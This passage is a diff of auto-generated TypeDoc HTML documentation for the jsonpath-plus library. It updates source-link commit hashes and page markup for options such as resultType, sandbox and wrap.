class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span></div><div class=\"tsd-comment tsd-typography\"><p>Can be case-insensitive form of &quot;value&quot;, &quot;path&quot;, &quot;pointer&quot;, &quot;parent&quot;,\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#path\">path</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L21\">jsonpath.d.ts:21</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"resultType\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>result<wbr/>Type</span><a href=\"#resultType\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">result<wbr/>Type</span><span class=\"tsd-signature-symbol\">?:</span> <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;value&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;path&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;pointer&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parent&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;parentProperty&quot;</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">&quot;all&quot;</span></div><div class=\"tsd-comment tsd-typography\"><p>Can be case-insensitive form of &quot;value&quot;, &quot;path&quot;, &quot;pointer&quot;, &quot;parent&quot;,\n or &quot;parentProperty&quot; to determine respectively whether to return\n results as the values of the found items, as their absolute paths,\n as JSON Pointers to the absolute paths, as their parent objects,\n\n@@ -86,11 +86,11 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-8\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-8\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-2\">&#39;value&#39;</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#resultType\">resultType</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L53\">jsonpath.d.ts:53</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"sandbox\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>sandbox</span><a href=\"#sandbox\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">sandbox</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span></div><div class=\"tsd-comment tsd-typography\"><p>Key-value map of variables to be available to code evaluations such\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#resultType\">resultType</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L53\">jsonpath.d.ts:53</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"sandbox\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>sandbox</span><a href=\"#sandbox\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">sandbox</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">Map</span><span class=\"tsd-signature-symbol\">&lt;</span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">, </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">&gt;</span></div><div class=\"tsd-comment tsd-typography\"><p>Key-value map of variables to be available to code evaluations such\n as filtering expressions.\n (Note that the current path and value will also be available to those\n expressions; see the Syntax section for details.)</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#sandbox\">sandbox</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L62\">jsonpath.d.ts:62</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"wrap\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>wrap</span><a href=\"#wrap\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">wrap</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether or not to wrap the results in an array.</p>\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#sandbox\">sandbox</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L62\">jsonpath.d.ts:62</a></li></ul></aside></section><section class=\"tsd-panel tsd-member tsd-is-inherited\"><a id=\"wrap\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><code class=\"tsd-tag\">Optional</code><span>wrap</span><a href=\"#wrap\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">wrap</span><span class=\"tsd-signature-symbol\">?:</span> <span class=\"tsd-signature-type\">boolean</span></div><div class=\"tsd-comment tsd-typography\"><p>Whether or not to wrap the results in an array.</p>\n <p>If wrap is set to false, and no results are found, undefined will be\n returned (as opposed to an empty array when wrap is set to true).</p>\n <p>If wrap is set to false and a single non-array result is found, that\n\n@@ -102,4 +102,4 @@\n</div><div class=\"tsd-comment tsd-typography\"><div class=\"tsd-tag-Default\"><h4 class=\"tsd-anchor-link\"><a id=\"Default-9\" class=\"tsd-anchor\"></a>Default<a href=\"#Default-9\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h4><pre><code class=\"ts\"><span class=\"hl-3\">true</span>\n </code><button type=\"button\">Copy</button></pre>\n \n-</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#wrap\">wrap</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L79\">jsonpath.d.ts:79</a></li></ul></aside></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#autostart\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart</span></a><a href=\"#callback\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>callback</span></a><a href=\"#eval\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>eval</span></a><a href=\"#flatten\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>flatten</span></a><a href=\"#ignoreEvalErrors\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>ignore<wbr/>Eval<wbr/>Errors</span></a><a href=\"#json\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>json</span></a><a href=\"#otherTypeCallback\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>other<wbr/>Type<wbr/>Callback</span></a><a href=\"#parent\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent</span></a><a href=\"#parentProperty\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent<wbr/>Property</span></a><a href=\"#path\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>path</span></a><a href=\"#resultType\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>result<wbr/>Type</span></a><a href=\"#sandbox\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>sandbox</span></a><a href=\"#wrap\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>wrap</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+</div></div><aside class=\"tsd-sources\"><p>Inherited from <a href=\"JSONPathOptions.html\">JSONPathOptions</a>.<a href=\"JSONPathOptions.html#wrap\">wrap</a></p><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L79\">jsonpath.d.ts:79</a></li></ul></aside></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#autostart\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>autostart</span></a><a href=\"#callback\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>callback</span></a><a href=\"#eval\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>eval</span></a><a href=\"#flatten\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>flatten</span></a><a href=\"#ignoreEvalErrors\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>ignore<wbr/>Eval<wbr/>Errors</span></a><a href=\"#json\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>json</span></a><a href=\"#otherTypeCallback\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>other<wbr/>Type<wbr/>Callback</span></a><a href=\"#parent\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent</span></a><a href=\"#parentProperty\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>parent<wbr/>Property</span></a><a href=\"#path\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>path</span></a><a href=\"#resultType\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>result<wbr/>Type</span></a><a href=\"#sandbox\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>sandbox</span></a><a href=\"#wrap\" class=\"tsd-is-inherited\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>wrap</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/modules.html:\n```\n@@ -1,4 +1,4 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"assets/style.css\"/><link rel=\"stylesheet\" href=\"assets/highlight.css\"/><script defer src=\"assets/main.js\"></script><script async src=\"assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\".\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><h2>jsonpath-plus</h2></div><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><h3 class=\"tsd-index-heading uppercase\">Index</h3><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Classes</h3><div class=\"tsd-index-list\"><a href=\"classes/EvalClass.html\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-128\"></use></svg><span>Eval<wbr/>Class</span></a>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"assets/style.css\"/><link rel=\"stylesheet\" href=\"assets/highlight.css\"/><script defer src=\"assets/main.js\"></script><script async src=\"assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\".\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"modules.html\">jsonpath-plus</a></li></ul><h1>jsonpath-plus</h1></div><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><h3 class=\"tsd-index-heading uppercase\">Index</h3><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Classes</h3><div class=\"tsd-index-list\"><a href=\"classes/EvalClass.html\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-128\"></use></svg><span>Eval<wbr/>Class</span></a>\n <a href=\"classes/JSONPathClass.html\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-128\"></use></svg><span>JSONPath<wbr/>Class</span></a>\n </div></section><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Interfaces</h3><div class=\"tsd-index-list\"><a href=\"interfaces/JSONPathCallable.html\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-256\"></use></svg><span>JSONPath<wbr/>Callable</span></a>\n <a href=\"interfaces/JSONPathOptions.html\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"assets/icons.svg#icon-256\"></use></svg><span>JSONPath<wbr/>Options</span></a>\n```\n\nFilename: docs/ts/types/JSONPathCallback.html:\n```\n@@ -1 +1 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathCallback | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathCallback.html\">JSONPathCallback</a></li></ul><h1>Type Alias JSONPathCallback</h1></div><div class=\"tsd-signature\"><span class=\"tsd-kind-type-alias\">JSONPath<wbr/>Callback</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">payload</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span>, <span class=\"tsd-kind-parameter\">payloadType</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span>, <span class=\"tsd-kind-parameter\">fullPayload</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L5\">jsonpath.d.ts:5</a></li></ul></aside></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary 